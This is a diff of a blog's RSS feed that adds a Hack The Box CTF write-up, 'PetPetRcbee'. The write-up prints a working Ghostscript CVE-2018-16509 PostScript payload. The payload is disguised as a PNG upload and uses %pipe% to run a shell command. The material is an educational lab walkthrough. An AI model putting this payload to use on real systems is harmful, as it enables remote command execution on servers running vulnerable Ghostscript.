@@ -247,6 +247,33 @@ While DEFCON is no longer the insane party that you may have heard of in the pas
 <p>And lastly&hellip; book travel and hotel more than 3 weeks in advance, even if it&rsquo;s on my own dime.</p>
 <h1 id="and-in-closing">And in closing&hellip;</h1>
 <p>Don&rsquo;t think about going to DEFCON. If you&rsquo;ve watched a talk, or heard about a village, and it sounds even remotely interesting - <strong>GO TO DEFCON</strong>.</p>
+]]></content></item><item><title>Hack The Box - PetPetRcbee</title><link>https://maclarel.github.io/posts/2022-09/htb_petpetrcbee/</link><pubDate>Mon, 15 Aug 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2022-09/htb_petpetrcbee/</guid><description>Premise PetPetRcbee is a Web challenge from Hack The Box that presents itself as a website which will take an image and animate it. Unlike many other challenges, you may be able to solve this one without ever actually looking at the site or seeing how it works&amp;hellip;
+The setup This is a Flask application using Pillow and Ghostscript (9.23 - remember this) as the basis for its functionality. The overall source code is quite minimal, so review is easy.</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
+<p>PetPetRcbee is a <code>Web</code> challenge from Hack The Box that presents itself as a website which will take an image and animate it. Unlike many other challenges, you may be able to solve this one without ever actually looking at the site or seeing how it works&hellip;</p>
+<h1 id="the-setup">The setup</h1>
+<p>This is a Flask application using Pillow and Ghostscript (9.23 - remember this) as the basis for its functionality. The overall source code is quite minimal, so review is easy.</p>
+<p>Two things jump out here:</p>
+<ol>
+<li>Ghostscript 9.23 is ancient, having come out over 4 years ago. This is prime vulnerable software territory.</li>
+<li>Reviewing the code shows that uploaded files are passed along to Ghostscript with no validation beyond the file extension.</li>
+</ol>
+<p>The intent here seems pretty clear - find a way to exploit Ghostscript with an arbitrary file upload.</p>
+<h1 id="ghost-in-the-shellcode">Ghost in the shellcode</h1>
+<p>Welp, this one is straight forward. Google for <code>Ghostscript 9.23 exploit</code> and you&rsquo;ll wind up with <a href="https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509">CVE-2018-16509</a>. This works pretty much out of the box, all you need to do is update the path, and since it&rsquo;s a whitebox challenge you know exactly where it&rsquo;ll land:</p>
+<p>Let&rsquo;s fire it up and test out the exploit above:</p>
+<pre><code>%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: -0 -0 100 100
+
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%cat flag &gt;&gt; /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
+</code></pre><p>Save that as <code>pwn.png</code> and upload it to the service.</p>
+<p>Voila, the flag is then accessible at <code>http://host:port/static/petpets/flag.txt</code>.</p>
+<p>GG, though I will say this one was a bit too easy.</p>
 ]]></content></item><item><title>Hack The Box - Phonebook</title><link>https://maclarel.github.io/posts/2022-08/htb_phonebook/</link><pubDate>Mon, 15 Aug 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2022-08/htb_phonebook/</guid><description>Premise Phonebook is a Web challenge from Hack The Box that presents us with a login page for a &amp;ldquo;phonebook&amp;rdquo; system. The goal here is to find a flag hidden somewhere, however it&amp;rsquo;s considerably less obvious than it may seem.
 Exploration When first navigating to the challenge URL you&amp;rsquo;l be greeted with a login prompt to access the phonebook. There don&amp;rsquo;t appear to be any useful links here, however there&amp;rsquo;s a note that the system now supports &amp;ldquo;workstation logins&amp;rdquo; and that post is signed by someone called &amp;ldquo;Reese&amp;rdquo;.</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
 <p>Phonebook is a <code>Web</code> challenge from Hack The Box that presents us with a login page for a &ldquo;phonebook&rdquo; system. The goal here is to find a flag hidden somewhere, however it&rsquo;s considerably less obvious than it may seem.</p>
